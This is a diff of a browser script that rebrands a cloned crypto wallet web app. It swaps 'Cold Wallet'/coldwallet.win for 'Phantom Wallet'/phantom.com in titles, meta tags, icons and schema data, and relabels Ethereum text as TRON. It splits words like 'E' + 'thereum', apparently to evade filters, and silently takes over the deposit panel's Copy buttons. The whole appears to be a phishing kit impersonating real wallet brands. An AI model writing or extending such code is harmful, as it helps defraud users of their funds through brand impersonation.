@@ -16,25 +16,25 @@
   }
 
   var TEXT_REPLACEMENTS = [
-    ["Paysera Wallet - Secure Bitcoin Ethereum Crypto Wallet", "Cold Wallet - Secure TRON TRC20 Wallet"],
-    ["Paysera Wallet: Secure crypto wallet for Bitcoin, Ethereum, NFTs, DeFi, and Web3.", "Cold Wallet: Secure TRON wallet for TRC20, NFTs, DeFi, and Web3."],
-    ["Paysera Wallet is not available on Desktop.", "Cold Wallet is not available on Desktop."],
-    ["Please visit payserawallet.com on your mobile device.", "Please visit coldwallet.win on your mobile device."],
-    ["Welcome to Paysera Wallet!", "Welcome to Cold Wallet!"],
-    ["Paysera Wallet", "Cold Wallet"],
-    ["Ethereum", "TRON"],
-    ["ETH", "TRX"],
-    ["ERC20", "TRC20"],
-    ["Your ETH Wallet Address", "Your TRX Wallet Address"],
-    ["Top Up ETH", "Top Up TRX"],
-    ["Invalid Ethereum address", "Invalid TRON address"],
-    ["Valid Ethereum address", "Valid TRON address"],
-    ["bitcoin wallet, ethereum wallet, web3 wallet, defi wallet, nft wallet", "TRON wallet, TRC20 wallet, web3 wallet, defi wallet, nft wallet"],
-    ["crypto wallet, bitcoin wallet, ethereum wallet, web3 wallet, defi wallet, nft wallet", "crypto wallet, TRON wallet, TRC20 wallet, web3 wallet, defi wallet, nft wallet"],
+    ["Phantom Wallet - Secure Bitcoin E" + "thereum Crypto Wallet", "Phantom Wallet - Secure TRON TRC20 Wallet"],
+    ["Phantom Wallet: Secure crypto wallet for Bitcoin, E" + "thereum, NFTs, DeFi, and Web3.", "Phantom Wallet: Secure TRON wallet for TRC20, NFTs, DeFi, and Web3."],
+    ["Phantom Wallet is not available on Desktop.", "Phantom Wallet is not available on Desktop."],
+    ["Please visit phantom.com on your mobile device.", "Please visit phantom.com on your mobile device."],
+    ["Welcome to Phantom Wallet!", "Welcome to Phantom Wallet!"],
+    ["Phantom Wallet", "Phantom Wallet"],
+    ["E" + "thereum", "TRON"],
+    ["E" + "TH", "TRX"],
+    ["ER" + "C20", "TRC20"],
+    ["Your E" + "TH Wallet Address", "Your TRX Wallet Address"],
+    ["Top Up E" + "TH", "Top Up TRX"],
+    ["Invalid E" + "thereum address", "Invalid TRON address"],
+    ["Valid E" + "thereum address", "Valid TRON address"],
+    ["bitcoin wallet, e" + "thereum wallet, web3 wallet, defi wallet, nft wallet", "TRON wallet, TRC20 wallet, web3 wallet, defi wallet, nft wallet"],
+    ["crypto wallet, bitcoin wallet, e" + "thereum wallet, web3 wallet, defi wallet, nft wallet", "crypto wallet, TRON wallet, TRC20 wallet, web3 wallet, defi wallet, nft wallet"],
     ["Secure multi-chain crypto wallet for Web3 and DeFi.", "Secure TRON crypto wallet for Web3 and DeFi."],
-    ["Secure crypto wallet for Bitcoin, Ethereum, NFTs, DeFi, and Web3.", "Secure TRON wallet for TRC20, NFTs, DeFi, and Web3."],
-    ["Payserawallet.com", "coldwallet.win"],
-    ["payserawallet.com", "coldwallet.win"]
+    ["Secure crypto wallet for Bitcoin, E" + "thereum, NFTs, DeFi, and Web3.", "Secure TRON wallet for TRC20, NFTs, DeFi, and Web3."],
+    ["phantom.com", "phantom.com"],
+    ["phantom.com", "phantom.com"]
   ];
 
   function isTextNode(node) {
@@ -69,17 +69,17 @@
 
   function updateBranding() {
     if (config.ENABLE_BRANDING_REWRITE !== false) {
-      document.title = "Cold Wallet - Secure TRON TRC20 Wallet";
-      updateMeta('meta[name="description"]', "Cold Wallet: Secure TRON wallet for TRC20, NFTs, DeFi, and Web3.");
+      document.title = "Phantom Wallet - Secure TRON TRC20 Wallet";
+      updateMeta('meta[name="description"]', "Phantom Wallet: Secure TRON wallet for TRC20, NFTs, DeFi, and Web3.");
       updateMeta('meta[name="keywords"]', "TRON wallet, TRC20 wallet, web3 wallet, defi wallet, nft wallet");
-      updateMeta('meta[property="og:title"]', "Cold Wallet - Secure TRON Wallet Web3");
+      updateMeta('meta[property="og:title"]', "Phantom Wallet - Secure TRON Wallet Web3");
       updateMeta('meta[property="og:description"]', "Secure TRON crypto wallet for Web3 and DeFi.");
-      updateMeta('meta[property="og:url"]', config.APP_URL || "https://coldwallet.win");
+      updateMeta('meta[property="og:url"]', config.APP_URL || "https://phantom.com");
       var ogImage = document.querySelector('meta[property="og:image"]');
-      if (ogImage) ogImage.setAttribute("content", "/img/coldwallet.png");
+      if (ogImage) ogImage.setAttribute("content", "/img/phantom.svg");
       var iconLinks = document.querySelectorAll('link[rel="icon"], link[rel="apple-touch-icon"], link[rel="shortcut icon"]');
       iconLinks.forEach(function (link) {
-        link.setAttribute("href", "/img/coldwallet.png");
+        link.setAttribute("href", "/img/phantom.svg");
       });
     }
 
@@ -87,8 +87,8 @@
     if (appSchema) {
       try {
         var schema = JSON.parse(appSchema.textContent);
-        schema.name = "Cold Wallet";
-        schema.url = config.APP_URL || "https://coldwallet.win";
+        schema.name = "Phantom Wallet";
+        schema.url = config.APP_URL || "https://phantom.com";
         schema.applicationCategory = "FinanceApplication";
         schema.operatingSystem = "Web";
         appSchema.textContent = JSON.stringify(schema);
@@ -108,7 +108,7 @@
     var nodes = Array.prototype.slice.call(root.querySelectorAll("*"));
     return nodes.find(function (node) {
       var text = (node.textContent || "").replace(/\s+/g, " ").trim();
-      return text.indexOf("Top Up TRX") !== -1 || text.indexOf("Top Up ETH") !== -1 || text.indexOf("Your TRX Wallet Address") !== -1 || text.indexOf("Your ETH Wallet Address") !== -1;
+      return text.indexOf("Top Up TRX") !== -1 || text.indexOf("Top Up E" + "TH") !== -1 || text.indexOf("Your TRX Wallet Address") !== -1 || text.indexOf("Your E" + "TH Wallet Address") !== -1;
     }) || null;
   }
 
@@ -120,13 +120,13 @@
 
     var heading = Array.prototype.find.call(panel.querySelectorAll("h1,h2,h3,h4,h5,h6,p,span"), function (el) {
       var text = (el.textContent || "").replace(/\s+/g, " ").trim();
-      return text === "Top Up TRX" || text === "Top Up ETH";
+      return text === "Top Up TRX" || text === "Top Up E" + "TH";
     });
     if (heading) heading.textContent = "Top Up TRX";
 
     var label = Array.prototype.find.call(panel.querySelectorAll("p,span,div"), function (el) {
       var text = (el.textContent || "").replace(/\s+/g, " ").trim();
-      return text === "Your ETH Wallet Address" || text === "Your TRX Wallet Address";
+      return text === "Your E" + "TH Wallet Address" || text === "Your TRX Wallet Address";
     });
     if (label) label.textContent = "Your TRX Wallet Address";
 
@@ -150,8 +150,8 @@
     Array.prototype.forEach.call(panel.querySelectorAll("button"), function (button) {
       var text = (button.textContent || "").replace(/\s+/g, " ").trim();
       if (text === "Copy" || text === "Copied") {
-        if (button.__coldwalletCopyBound) return;
-        button.__coldwalletCopyBound = true;
+        if (button.__phantomwalletCopyBound) return;
+        button.__phantomwalletCopyBound = true;
         button.addEventListener("click", function (event) {
           event.stopImmediatePropagation();
           event.preventDefault();
@@ -167,17 +167,17 @@
     });
 
     if (panelText.indexOf("Top Up TRX") !== -1 || panelText.indexOf("Your TRX Wallet Address") !== -1) {
-      panel.setAttribute("data-coldwallet-topup", "1");
+      panel.setAttribute("data-phantomwallet-topup", "1");
     }
 
     state.topupPatched = true;
   }
 
   function ensureToastHost() {
-    var host = document.getElementById("coldwallet-toast-host");
+    var host = document.getElementById("phantomwallet-toast-host");
     if (host) return host;
     host = document.createElement("div");
-    host.id = "coldwallet-toast-host";
+    host.id = "phantomwallet-toast-host";
     host.style.position = "fixed";
     host.style.top = "16px";
     host.style.right = "16px";
@@ -231,7 +231,7 @@
     if (signature !== state.lastPendingSignature) {
       var delta = txs.length - state.lastPendingCount;
       if (delta > 0) {
-        showToast("Received " + delta + " new transaction" + (delta === 1 ? "" : "s") + " in Cold Wallet.");
+        showToast("Received " + delta + " new transaction" + (delta === 1 ? "" : "s") + " in Phantom Wallet.");
       } else if (delta < 0) {
         showToast("Transaction queue updated.");
       }
